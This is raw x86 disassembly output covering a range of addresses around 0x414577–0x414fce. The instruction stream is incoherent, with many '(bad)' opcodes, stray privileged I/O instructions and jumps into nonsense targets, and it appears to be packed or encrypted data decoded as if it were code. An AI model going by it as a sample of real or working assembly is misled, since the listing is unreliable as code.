  414577:	sti    
  414578:	cmp    esi,0xc39361b0
  41457e:	sti    
  41457f:	mov    eax,ds:0x2c118ec4
  414584:	fs mov cl,0x1f
  414587:	adc    cl,0x3c
  41458a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41458b:	xor    BYTE PTR [ebp+0x116d4940],dh
  414591:	imul   dl
  414593:	je     0x414518
  414595:	(bad)  
  414596:	mov    al,0xee
  414598:	fcmovb st,st(4)
  41459a:	leave  
  41459b:	in     eax,dx
  41459c:	mov    ch,0x2e
  41459e:	inc    esi
  41459f:	lgs    edx,FWORD PTR [esi]
  4145a2:	stc    
  4145a3:	mov    WORD PTR [edi-0x4e],fs
  4145a6:	shr    BYTE PTR [edx-0xb3e32b],1
  4145ac:	jg     0x414628
  4145ae:	xchg   ebp,eax
  4145af:	mov    edx,0x910129ad
  4145b4:	mov    al,0xa
  4145b6:	mov    bh,0xd3
  4145b8:	mov    DWORD PTR [ecx-0x24cf2f36],edi
  4145be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145bf:	aaa    
  4145c0:	ja     0x41456e
  4145c2:	mov    ebp,0x21cbb83b
  4145c7:	pop    DWORD PTR [si]
  4145ca:	aaa    
  4145cb:	pop    edx
  4145cc:	or     dl,BYTE PTR [ebp+0x77b52d2d]
  4145d2:	cmp    ebp,DWORD PTR [ebx-0x29]
  4145d5:	xchg   esi,eax
  4145d6:	push   esp
  4145d7:	sub    eax,0xa56d7803
  4145dc:	lahf   
  4145dd:	jae    0x41463b
  4145df:	jae    0x41463e
  4145e1:	sub    ah,BYTE PTR [ecx]
  4145e3:	xchg   ebp,eax
  4145e4:	dec    edi
  4145e5:	retf   
  4145e6:	imul   ebx,DWORD PTR [ebx+esi*4],0x18
  4145ea:	add    edi,DWORD PTR [ebx+ebp*4]
  4145ed:	and    eax,0xc24ad410
  4145f2:	cmc    
  4145f3:	jae    0x4145ac
  4145f5:	mov    esp,0x5a814c0d
  4145fa:	out    0xd8,al
  4145fc:	inc    ecx
  4145fd:	mov    esi,0xec85c3ab
  414602:	adc    DWORD PTR [edx+ebx*2],ebx
  414605:	scas   al,BYTE PTR es:[edi]
  414606:	xor    al,0x3e
  414608:	jns    0x414599
  41460a:	adc    DWORD PTR [eax+0x4fe54508],eax
	...
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x2b
  414681:	mov    dh,0x92
  414683:	pop    ds
  414684:	lock (bad) 
  414686:	add    BYTE PTR [eax],al
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	pop    eax
  41468d:	repz fs call 0xa94f:0xdef5887a
  414696:	call   0x8e89:0xd1eac1ba
  41469d:	rcr    ah,0xc7
  4146a0:	adc    BYTE PTR [edi-0x3d],0x22
  4146a4:	jp     0x414723
  4146a6:	lahf   
  4146a7:	mov    al,BYTE PTR [ebp+0x3c]
  4146aa:	aad    0x81
  4146ac:	jecxz  0x414669
  4146ae:	push   eax
  4146af:	adc    eax,DWORD PTR [ebx]
  4146b1:	mov    dl,0x93
  4146b3:	mov    bl,0x7
  4146b5:	xor    eax,0x45d494cd
  4146ba:	and    al,0x5a
  4146bc:	add    esi,0x4214fdfe
  4146c2:	das    
  4146c3:	inc    BYTE PTR [esi-0x2d]
  4146c6:	and    BYTE PTR [edx-0x26],dh
  4146c9:	(bad)  
  4146ca:	cld    
  4146cb:	js     0x4146a8
  4146cd:	je     0x414739
  4146cf:	cli    
  4146d0:	out    dx,al
  4146d1:	mov    edx,0x6184ddc0
  4146d6:	popa   
  4146d7:	lods   eax,DWORD PTR ds:[esi]
  4146d8:	or     ch,BYTE PTR [edx]
  4146da:	ins    BYTE PTR es:[edi],dx
  4146db:	push   esp
  4146dc:	mov    bh,0xb8
  4146de:	loop   0x414717
  4146e0:	int3   
  4146e1:	cmp    al,0x31
  4146e3:	outs   dx,BYTE PTR ds:[esi]
  4146e4:	aaa    
  4146e5:	fcomip st,st(1)
  4146e7:	imul   edx,edi,0x5d0a9805
  4146ed:	mov    cl,BYTE PTR [ecx]
  4146ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146f0:	inc    esp
  4146f1:	dec    ecx
  4146f2:	jb     0x414733
  4146f4:	xchg   esp,eax
  4146f5:	push   es
  4146f6:	(bad)  
  4146f7:	repz out dx,al
  4146f9:	xlat   BYTE PTR ds:[ebx]
  4146fa:	mov    edx,0x5c2ba8a3
  4146ff:	sahf   
  414700:	jecxz  0x41477b
  414702:	je     0x41471e
  414704:	into   
  414705:	(bad)  
  414706:	(bad)  
  414707:	stc    
  414708:	xor    bh,ah
  41470a:	shl    esp,0x7c
  41470d:	add    eax,0xf9c49ed2
  414712:	and    BYTE PTR [edi+0x2a981199],al
  414718:	test   eax,0x73d22c69
  41471d:	popf   
  41471e:	push   cs
  41471f:	adc    al,0x8a
  414721:	clc    
  414722:	push   ecx
  414723:	and    cl,bl
  414725:	outs   dx,DWORD PTR ds:[esi]
  414726:	pop    ebx
  414727:	cs cli 
  414729:	xchg   BYTE PTR [eax-0x2bddc505],bh
  41472f:	pop    ebx
  414730:	scas   al,BYTE PTR es:[edi]
  414731:	push   esp
  414732:	inc    ebp
  414733:	lods   al,BYTE PTR ds:[esi]
  414734:	daa    
  414735:	inc    ebx
  414736:	mov    al,ds:0x8ad6906d
  41473b:	cmc    
  41473c:	fisub  WORD PTR [eax-0x43efa4d4]
  414742:	sub    bh,BYTE PTR [eax-0x763129ab]
  414748:	loope  0x41479e
  41474a:	push   ecx
  41474b:	adc    eax,DWORD PTR [ebx+0x766d1d3e]
  414751:	dec    DWORD PTR [esi-0x71b12dce]
  414757:	pop    ds
  414758:	mov    DWORD PTR [ecx+ebp*1],ebx
  41475b:	xchg   ebx,eax
  41475c:	mov    ebp,0xb6a4c1ba
  414761:	xor    eax,0x1c204dd6
  414766:	pop    eax
  414767:	or     al,0x9b
  414769:	mov    BYTE PTR [eax],ah
  41476b:	outs   dx,DWORD PTR ds:[esi]
  41476c:	pop    ecx
  41476d:	sbb    eax,0xecef6f05
  414772:	sti    
  414773:	fs mov ebx,0x2069d323
  414779:	push   edx
  41477a:	call   0x1cde:0xdd5cb159
  414781:	pop    edx
  414782:	xor    eax,0x8dbeef63
  414787:	xchg   bh,bh
  414789:	(bad)  
  41478b:	mov    ecx,0x6214e246
	...
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x8d34b1a3
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	cmp    BYTE PTR [eax-0x68],bh
  41480f:	adc    eax,0x311fd4e9
  414814:	(bad)  
  414816:	or     cx,WORD PTR [ecx-0x45]
  41481a:	cld    
  41481b:	test   DWORD PTR [eax+0x7],esp
  41481e:	mov    ebp,0x696e7e0c
  414823:	mov    ds:0x4424179e,al
  414828:	sbb    eax,0x5c02bb98
  41482d:	(bad)  
  41482e:	out    0xab,eax
  414830:	mov    ds:0x720f476d,al
  414835:	dec    edx
  414836:	push   ds
  414837:	sub    dl,0x79
  41483a:	imul   esi,DWORD PTR [edi-0x29d6ea7e],0x5
  414841:	fcom   DWORD PTR [ebx+0x48]
  414844:	xchg   DWORD PTR [edi+0x65],esp
  414847:	xor    eax,ebx
  414849:	lods   al,BYTE PTR ds:[esi]
  41484a:	jmp    0x41485f
  41484c:	pop    ss
  41484d:	mov    al,0x22
  41484f:	add    eax,0x8c4a9314
  414854:	sbb    al,BYTE PTR [edi-0x77e84a1c]
  41485a:	mov    eax,0xc75f7d1a
  41485f:	mov    al,ds:0x870c942
  414864:	mov    edi,0x386cb682
  414869:	out    0x6d,eax
  41486b:	jno    0x4148ce
  41486d:	inc    edx
  41486e:	in     eax,0xfa
  414870:	or     DWORD PTR [ebp-0x61],ebp
  414873:	add    ecx,ebp
  414875:	addr16 jbe 0x414851
  414878:	xor    eax,0x6032ff57
  41487d:	mov    edx,DWORD PTR [ebx+0x4c3ad585]
  414883:	inc    ecx
  414884:	mov    ds:0xfdf644b8,eax
  414889:	pop    edx
  41488a:	in     al,0x97
  41488c:	icebp  
  41488d:	push   ss
  41488e:	mov    edi,0x2d041447
  414893:	jo     0x414829
  414895:	retf   0x83e9
  414898:	jecxz  0x414890
  41489a:	mov    cs,WORD PTR [ebp+0x1a5d81ff]
  4148a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148a1:	iret   
  4148a2:	jno    0x414847
  4148a4:	cmp    BYTE PTR [eax+0x64],al
  4148a7:	pop    esp
  4148a8:	jbe    0x41482e
  4148aa:	out    dx,eax
  4148ab:	cmp    al,0xd5
  4148ad:	jmp    0x62d46aa8
  4148b2:	jbe    0x4148f3
  4148b4:	pop    eax
  4148b5:	jp     0x4148a5
  4148b7:	mov    dl,0xfa
  4148b9:	push   esi
  4148ba:	jge    0x414913
  4148bc:	push   0xffffff9b
  4148be:	mov    al,ds:0x18eef456
  4148c3:	or     cl,ch
  4148c5:	sub    ebx,DWORD PTR [ecx-0x78cdd520]
  4148cb:	dec    eax
  4148cc:	push   edi
  4148cd:	push   esi
  4148ce:	add    eax,0xb35aeb15
  4148d3:	dec    ebx
  4148d4:	cdq    
  4148d5:	push   esp
  4148d6:	inc    esp
  4148d7:	in     al,dx
  4148d8:	cs sub ecx,edi
  4148db:	mov    eax,ds:0xec8c393b
  4148e0:	out    dx,al
  4148e1:	ins    DWORD PTR es:[edi],dx
  4148e2:	mov    edi,0xfe191e6d
  4148e7:	cmp    al,0x83
  4148e9:	shr    BYTE PTR [ebx+edx*8-0x55358cb3],cl
  4148f0:	shl    BYTE PTR ds:0x1b11a8c0,cl
  4148f6:	hlt    
  4148f7:	(bad)  
  4148f8:	fist   DWORD PTR [edx]
  4148fa:	mov    es,WORD PTR [esi-0x417b5185]
  414900:	or     eax,0xa172eb13
  414905:	sub    al,0xf1
  414907:	(bad)  
  414908:	mov    cl,0x24
  41490a:	dec    ecx
  41490b:	pop    ecx
  41490c:	mov    bh,0x28
  41490e:	and    DWORD PTR [eax],0x0
	...
  414971:	add    BYTE PTR [eax],al
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	mov    al,0x6c
  414982:	jae    0x414988
  414984:	clc    
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	or     al,0x2c
  41498e:	inc    edx
  41498f:	in     al,0x65
  414991:	and    WORD PTR [ebp+0x25],ax
  414995:	int    0xb9
  414997:	mov    ecx,0xc24af86b
  41499c:	jns    0x414962
  41499e:	mov    al,0xb7
  4149a0:	pop    ecx
  4149a1:	mul    BYTE PTR [edi+ebp*1+0x74]
  4149a5:	lds    esp,FWORD PTR [esi+0x2103402]
  4149ab:	sub    BYTE PTR [ecx+0x34],cl
  4149ae:	add    DWORD PTR [esi-0x74c8f09b],ecx
  4149b4:	lock gs adc ebp,edx
  4149b8:	inc    esi
  4149b9:	cmp    edx,DWORD PTR [edi-0x36]
  4149bc:	jge    0x4149d7
  4149be:	out    0xea,al
  4149c0:	push   esp
  4149c1:	mov    BYTE PTR [ecx-0x69],dh
  4149c4:	sub    al,0xc3
  4149c6:	dec    ebp
  4149c7:	and    al,0x89
  4149c9:	jno    0x4149a5
  4149cb:	pop    edx
  4149cc:	cmp    al,BYTE PTR [ebp+0x67]
  4149cf:	call   0xb19bd960
  4149d4:	dec    edi
  4149d5:	jecxz  0x41495a
  4149d7:	xor    edx,ecx
  4149d9:	lods   al,BYTE PTR ds:[esi]
  4149da:	inc    edx
  4149db:	add    eax,0x5a4a72
  4149e0:	pop    ds
  4149e1:	das    
  4149e2:	call   0x5fa:0x28f422ae
  4149e9:	push   ds
  4149ea:	icebp  
  4149eb:	into   
  4149ec:	dec    eax
  4149ed:	push   esp
  4149ee:	aas    
  4149ef:	jns    0x414a1b
  4149f1:	xor    bl,BYTE PTR [ebp-0x80]
  4149f4:	mov    esp,0x9c6b922c
  4149f9:	mov    ch,bl
  4149fb:	nop
  4149fc:	jmp    0x98e024ee
  414a01:	dec    esp
  414a02:	arpl   WORD PTR [edx-0x14],cx
  414a05:	xchg   ebx,eax
  414a06:	inc    esi
  414a07:	out    dx,eax
  414a08:	ja     0x4149ef
  414a0a:	mov    gs,WORD PTR [eax]
  414a0c:	stos   BYTE PTR es:[edi],al
  414a0d:	push   esi
  414a0e:	mov    ds:0x5d7880e9,al
  414a13:	dec    esi
  414a14:	inc    edi
  414a15:	or     eax,0x2d040065
  414a1a:	cdq    
  414a1b:	fimul  WORD PTR [edi]
  414a1d:	les    eax,FWORD PTR [esi]
  414a1f:	iret   
  414a20:	int    0xcb
  414a22:	daa    
  414a23:	lds    ecx,FWORD PTR [ebx]
  414a25:	xchg   ebp,eax
  414a26:	repz push ebp
  414a28:	adc    cl,0xef
  414a2b:	or     DWORD PTR ds:0x33cb7d66,ebp
  414a31:	stos   DWORD PTR es:[edi],eax
  414a32:	jns    0x414a8c
  414a34:	adc    esi,ebx
  414a36:	mov    ebx,0xa1d57f56
  414a3b:	ins    WORD PTR es:[edi],dx
  414a3d:	xchg   edi,eax
  414a3e:	(bad)  
  414a3f:	mov    eax,ds:0x2c583b6c
  414a44:	leave  
  414a45:	and    BYTE PTR [ebp+0x2f],cl
  414a48:	mov    edx,DWORD PTR [ecx+edi*2-0x3f083040]
  414a4f:	lods   al,BYTE PTR ds:[esi]
  414a50:	repnz (bad) 
  414a52:	dec    ebx
  414a53:	aam    0x89
  414a55:	and    DWORD PTR [edx-0x9],esi
  414a58:	lea    eax,[eax-0x47d4cfc0]
  414a5e:	fld    QWORD PTR [eax+0x42]
  414a61:	data16 jge 0x414a81
  414a64:	dec    esi
  414a65:	data16 scas al,BYTE PTR es:[di]
  414a68:	das    
  414a69:	ror    DWORD PTR [esi-0x10e78dac],1
  414a6f:	addr16 or eax,0x5dbeee60
  414a75:	fldcw  WORD PTR [esp+ebx*2]
  414a78:	fsubrp st(6),st
  414a7a:	pop    ecx
  414a7b:	add    ecx,DWORD PTR [eax]
  414a7d:	adc    ecx,DWORD PTR [edx+0x41]
  414a80:	ss inc ecx
  414a82:	jns    0x414af4
  414a84:	xor    eax,0x613d244f
  414a89:	fwait
  414a8a:	inc    ebp
  414a8b:	cmp    BYTE PTR [esi],dl
  414a8d:	or     DWORD PTR [ecx],ecx
  414a8f:	cmp    eax,DWORD PTR [eax]
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   ax,sp
  414b01:	js     0x414b7d
  414b03:	xlat   BYTE PTR ds:[ebx]
  414b04:	cld    
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	push   es
  414b0d:	popf   
  414b0e:	cdq    
  414b0f:	inc    esp
  414b10:	stos   DWORD PTR es:[edi],eax
  414b11:	xchg   BYTE PTR [edx+ebp*2+0x111e0c99],dh
  414b18:	ret    0xcc87
  414b1b:	sbb    BYTE PTR ds:0x8a8e110d,bl
  414b21:	add    edi,DWORD PTR [ebp+0x57a08f8]
  414b27:	cmp    al,0xa6
  414b29:	inc    eax
  414b2a:	jecxz  0x414ba4
  414b2c:	mov    ebp,0xedec2138
  414b31:	sub    al,0x56
  414b33:	and    ebp,eax
  414b35:	mov    esp,0x6c99afa
  414b3a:	mov    esp,0x3c99c3b1
  414b3f:	scas   al,BYTE PTR es:[edi]
  414b40:	jmp    FWORD PTR [esi-0x7e1a4ddc]
  414b46:	les    ebx,FWORD PTR [ecx]
  414b48:	push   0xffffffca
  414b4a:	dec    edx
  414b4b:	jmp    0x414b14
  414b4d:	shl    bh,cl
  414b4f:	xlat   BYTE PTR ds:[ebx]
  414b50:	xor    al,0xe5
  414b52:	lea    ebp,[ecx]
  414b54:	mov    ecx,0xb74e1eeb
  414b59:	outs   dx,DWORD PTR ds:[esi]
  414b5a:	retf   
  414b5b:	xor    DWORD PTR [ecx+0x18],ecx
  414b5e:	lea    eax,[edx-0x3296bb39]
  414b64:	pop    ecx
  414b65:	sar    DWORD PTR [esi],cl
  414b67:	loope  0x414b2d
  414b69:	aas    
  414b6a:	loop   0x414b17
  414b6c:	cmp    bh,al
  414b6e:	mov    ds:0x2ad89e0,eax
  414b73:	jge    0x414ba4
  414b75:	sbb    dl,ch
  414b77:	nop
  414b78:	dec    edi
  414b79:	jbe    0x414b42
  414b7b:	cli    
  414b7c:	sbb    bh,BYTE PTR [esi]
  414b7e:	push   eax
  414b7f:	sar    DWORD PTR [ecx-0x5cbe1770],cl
  414b85:	mov    ebp,0x4a472d8c
  414b8a:	stos   BYTE PTR es:[edi],al
  414b8b:	lods   eax,DWORD PTR ds:[esi]
  414b8c:	mov    bl,bl
  414b8e:	mov    cl,0xd
  414b90:	das    
  414b91:	test   DWORD PTR [eax+0x3e877a2e],0x8b1c319
  414b9b:	xchg   ebp,eax
  414b9c:	pop    ds
  414b9d:	xor    bh,BYTE PTR [ebx+0xab921d3]
  414ba3:	sub    ch,BYTE PTR [edi-0x1bdb4c43]
  414ba9:	test   DWORD PTR es:[edx+esi*8],ebx
  414bad:	aaa    
  414bae:	aas    
  414baf:	fcmovu st,st(6)
  414bb1:	mov    edx,gs
  414bb3:	add    al,0xd7
  414bb5:	adc    al,0xdf
  414bb7:	mov    dl,BYTE PTR [eax+esi*8-0x5d]
  414bbb:	mov    BYTE PTR [edx],dh
  414bbd:	mov    al,0xad
  414bbf:	lods   eax,DWORD PTR ds:[esi]
  414bc0:	pusha  
  414bc1:	stos   DWORD PTR es:[edi],eax
  414bc2:	scas   al,BYTE PTR es:[edi]
  414bc3:	idiv   DWORD PTR [edi-0x78]
  414bc6:	mul    DWORD PTR [esi]
  414bc8:	call   0xc4f8:0xe8af39e1
  414bcf:	xchg   ebp,eax
  414bd0:	xor    dl,cl
  414bd2:	mov    ecx,DWORD PTR [edx+0x776f0329]
  414bd8:	mov    ch,0xa9
  414bda:	addr16 xor eax,0x1c37ca33
  414be0:	loope  0x414c32
  414be2:	add    ecx,edi
  414be4:	push   edi
  414be5:	push   ds
  414be6:	sar    DWORD PTR [edx+0x7c7e52c7],1
  414bec:	sbb    al,0x1b
  414bee:	loop   0x414c40
  414bf0:	fs fmulp st(0),st
  414bf3:	xchg   edi,eax
  414bf4:	adc    eax,0xdd3f06a5
  414bf9:	jmp    0xdd0be219
  414bfe:	mov    esi,0x3f6353d0
  414c03:	and    DWORD PTR [edx+eiz*2-0xaf6b4ce],edx
  414c0a:	sub    dl,0x9c
  414c0d:	mov    esp,0x8520
	...
  414c72:	add    BYTE PTR [eax],al
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ebp,DWORD PTR cs:[edi+0x11af50]
  414c85:	fild   DWORD PTR [eax]
  414c87:	add    BYTE PTR [ecx+eax*1],al
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	pop    ds
  414c8d:	adc    al,0xca
  414c8f:	mov    ah,0xa8
  414c91:	dec    esi
  414c92:	or     DWORD PTR ss:[esi+ecx*4-0x46],edi
  414c97:	sti    
  414c98:	dec    ecx
  414c99:	adc    dh,BYTE PTR [ebx+eax*2+0xb]
  414c9d:	stos   BYTE PTR es:[edi],al
  414c9e:	xor    al,0x59
  414ca0:	sbb    eax,0xb90c8f69
  414ca5:	sar    BYTE PTR [edx+0x15],cl
  414ca8:	jl     0x414c6f
  414caa:	pop    ecx
  414cab:	test   eax,0x60b10705
  414cb0:	stos   BYTE PTR es:[edi],al
  414cb1:	test   eax,0xed038610
  414cb6:	sbb    ebx,eax
  414cb8:	movd   mm2,DWORD PTR [esi-0xb]
  414cbc:	(bad)  
  414cbd:	mov    esp,?
  414cbf:	loope  0x414c7b
  414cc1:	rol    ch,0xd1
  414cc4:	mov    dl,0xfa
  414cc6:	loopne 0x414c5f
  414cc8:	cmp    ah,BYTE PTR [edi]
  414cca:	mov    ss:0x93622a99,al
  414cd0:	cmc    
  414cd1:	sysret 
  414cd3:	pop    ecx
  414cd4:	xchg   ecx,eax
  414cd5:	popf   
  414cd6:	push   ebp
  414cd7:	out    0x8f,eax
  414cd9:	inc    eax
  414cda:	cmp    ebx,DWORD PTR [ecx-0x64]
  414cdd:	leave  
  414cde:	pop    edi
  414cdf:	cmp    esi,ecx
  414ce1:	pop    eax
  414ce2:	lods   eax,DWORD PTR ds:[esi]
  414ce3:	repnz sub eax,0xf8dded87
  414ce9:	fs in  al,dx
  414ceb:	jg     0x414c8f
  414ced:	mov    WORD PTR [eax-0x75ab0551],cs
  414cf3:	arpl   WORD PTR [ebx],ax
  414cf5:	xor    ch,BYTE PTR [ebx+ecx*2+0x49a4d024]
  414cfc:	add    al,0x17
  414cfe:	sub    eax,0x1a907468
  414d03:	loope  0x414c90
  414d05:	mov    edx,0x45b82890
  414d0a:	pop    ecx
  414d0b:	add    BYTE PTR [esi-0xfb395fe],ch
  414d11:	mov    ebp,0xd523de75
  414d16:	jle    0x414d46
  414d18:	and    eax,0xf9077224
  414d1d:	paddusw mm1,QWORD PTR ds:0x6b3ab3af
  414d24:	(bad)  
  414d25:	mov    edi,0x76c3e4f1
  414d2a:	pusha  
  414d2b:	pop    ebp
  414d2c:	add    DWORD PTR [ecx+0x2d],ecx
  414d2f:	out    dx,al
  414d30:	xchg   BYTE PTR [esi],ch
  414d32:	xchg   esi,eax
  414d33:	ficomp DWORD PTR [esp+esi*8+0x17]
  414d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d38:	mov    eax,ds:0x5a9513ca
  414d3d:	test   al,0xc2
  414d3f:	in     eax,0x6b
  414d41:	fsub   DWORD PTR [ebx]
  414d43:	pop    esi
  414d44:	stc    
  414d45:	jne    0x414d04
  414d47:	push   ecx
  414d48:	fistp  QWORD PTR [edi-0x3a]
  414d4b:	ss pop esp
  414d4d:	nop
  414d4e:	xor    DWORD PTR [edi+edx*8+0x6e],ebp
  414d52:	(bad)  
  414d54:	inc    esi
  414d55:	test   BYTE PTR [ecx-0x57deef38],dl
  414d5b:	fs add edi,edx
  414d5e:	mov    ecx,ds
  414d60:	jg     0x414d8b
  414d62:	repnz fcmovb st,st(3)
  414d65:	dec    edi
  414d66:	cmp    dl,0x56
  414d69:	sbb    al,0x78
  414d6b:	add    BYTE PTR [edi+0x1f],0x3c
  414d6f:	or     al,dl
  414d71:	inc    edi
  414d72:	iret   
  414d73:	bound  edi,QWORD PTR [edx-0xf]
  414d76:	xchg   edx,eax
  414d77:	aas    
  414d78:	push   ss
  414d79:	mov    gs:0xdf1ed07a,eax
  414d7f:	inc    edi
  414d80:	leave  
  414d81:	jno    0x414dcd
  414d83:	stos   BYTE PTR es:[edi],al
  414d84:	mov    esi,0x6942dbd1
  414d89:	mov    ebp,ebx
  414d8b:	into   
  414d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d8d:	es or  al,0x41
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x25e6b668
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	imul   eax,DWORD PTR [eax],0x63
  414e0f:	ss pusha 
  414e11:	fisub  WORD PTR [esi+0x1]
  414e14:	leave  
  414e15:	nop
  414e16:	xor    BYTE PTR [edi-0x25],dh
  414e19:	xchg   DWORD PTR [ecx],esi
  414e1b:	div    eax
  414e1d:	cmp    al,0x2c
  414e20:	or     ebp,DWORD PTR [ecx-0x127e8e3d]
  414e26:	jne    0x414dde
  414e28:	push   esi
  414e29:	xor    BYTE PTR [edx],ah
  414e2b:	fabs   
  414e2d:	xor    dh,BYTE PTR [ecx-0x27]
  414e30:	jae    0x414e8b
  414e32:	mov    bh,0xf7
  414e34:	xor    bh,BYTE PTR [eax]
  414e36:	mov    BYTE PTR [ebx+eiz*2-0x4d],dl
  414e3a:	push   esp
  414e3b:	jge    0x414e95
  414e3d:	adc    BYTE PTR [ecx+0x68c54818],0xdd
  414e44:	push   ds
  414e45:	push   esp
  414e46:	mov    ebx,0xed5a164a
  414e4b:	and    al,0xd2
  414e4d:	mov    dh,BYTE PTR [ebx]
  414e4f:	xor    esi,DWORD PTR [edx-0x446ecba0]
  414e55:	daa    
  414e56:	out    0x21,eax
  414e58:	xor    al,BYTE PTR [edx+0x1dc23617]
  414e5e:	mov    dh,0x77
  414e60:	fisttp DWORD PTR [esi-0x72]
  414e63:	test   BYTE PTR [eax+0xa918674],ch
  414e69:	inc    eax
  414e6a:	or     ecx,DWORD PTR [esi-0x5e]
  414e6d:	jecxz  0x414e4a
  414e6f:	shl    DWORD PTR [ebx],1
  414e71:	adc    BYTE PTR [edi+0x6b],ch
  414e74:	popf   
  414e75:	ins    BYTE PTR es:[edi],dx
  414e76:	hlt    
  414e77:	stos   BYTE PTR es:[edi],al
  414e78:	fiadd  WORD PTR [ecx]
  414e7a:	(bad)
  414e7e:	clc    
  414e7f:	outs   dx,DWORD PTR ds:[esi]
  414e80:	or     al,0x97
  414e82:	aad    0xb4
  414e84:	es sub al,0x2c
  414e87:	xchg   BYTE PTR [eax],dl
  414e89:	lea    edi,[esi+0x23]
  414e8c:	repnz sub bh,BYTE PTR [ebp+0x52]
  414e90:	js     0x414ec1
  414e92:	and    DWORD PTR [ebp+0x6572f322],esi
  414e98:	or     BYTE PTR [edx],bl
  414e9a:	movd   DWORD PTR [ebx-0x7e2ce8],mm6
  414ea1:	sbb    eax,0x2ba92e9b
  414ea6:	adc    edi,ecx
  414ea8:	inc    esp
  414ea9:	jbe    0x414e4a
  414eab:	inc    ecx
  414eac:	pop    ecx
  414ead:	clc    
  414eae:	sti    
  414eaf:	inc    ebp
  414eb0:	mov    ebp,0x87ce56ad
  414eb5:	or     bl,0xb
  414eb8:	ret    0x5f5f
  414ebb:	jp     0x414f17
  414ebd:	hlt    
  414ebe:	push   ss
  414ebf:	div    DWORD PTR [esi]
  414ec1:	sbb    bh,al
  414ec3:	push   ecx
  414ec4:	xlat   BYTE PTR ds:[ebx]
  414ec5:	xor    eax,0xc593c240
  414eca:	out    dx,eax
  414ecb:	in     al,0xb3
  414ecd:	sub    DWORD PTR [eax-0x53],edi
  414ed0:	xor    ah,ch
  414ed2:	or     esi,DWORD PTR [edx-0x1cfeaffc]
  414ed8:	jl     0x414e5b
  414eda:	dec    esi
  414edb:	mov    ebx,0xa48b607
  414ee0:	xor    DWORD PTR [edx+ecx*1],ebp
  414ee3:	ror    BYTE PTR [edx+edx*2+0x25],cl
  414ee7:	cmc    
  414ee8:	and    dl,BYTE PTR [edx]
  414eea:	mov    bh,0x9d
  414eec:	jno    0x414e99
  414eee:	push   esp
  414eef:	cwde   
  414ef0:	call   0x297b0bb1
  414ef5:	sub    bl,al
  414ef7:	mov    ecx,0xa2bcb506
  414efc:	dec    edi
  414efd:	sbb    DWORD PTR [edx-0x60],esp
  414f00:	mov    DWORD PTR [edx+0x1e],edx
  414f03:	test   eax,0x770bb950
  414f08:	mov    bl,0xb2
  414f0a:	pop    esi
  414f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f0c:	(bad)  
  414f0d:	jo     0x414eb5
  414f0f:	jl     0x414f11
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x8eb382f9
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	retf   0xaa38
  414f8f:	sub    eax,0xe6db0741
  414f94:	(bad)  
  414f95:	cld    
  414f96:	sar    BYTE PTR [edi],cl
  414f98:	clc    
  414f99:	push   0xffffffaf
  414f9b:	jo     0x414fde
  414f9d:	les    eax,FWORD PTR [edi-0x76]
  414fa0:	bound  ebp,QWORD PTR [eax]
  414fa2:	lock xor DWORD PTR [ebx],ebx
  414fa5:	scas   al,BYTE PTR es:[edi]
  414fa6:	xor    BYTE PTR [eax+0x7e2c74b9],cl
  414fac:	add    al,0x6e
  414fae:	mov    ds:0x901b9136,eax
  414fb3:	jns    0x414faa
  414fb5:	mov    ch,0x4b
  414fb7:	xchg   ebx,eax
  414fb8:	mov    ebx,0xb5ead01b
  414fbd:	and    al,0x85
  414fbf:	jno    0x414f57
  414fc1:	scas   eax,DWORD PTR es:[edi]
  414fc2:	dec    eax
  414fc3:	das    
  414fc4:	push   ss
  414fc5:	and    esp,DWORD PTR [edi-0x64]
  414fc8:	rol    BYTE PTR [ebx-0x6adc6af0],1
  414fce:	add    ecx,DWORD PTR ds:0x495dee03
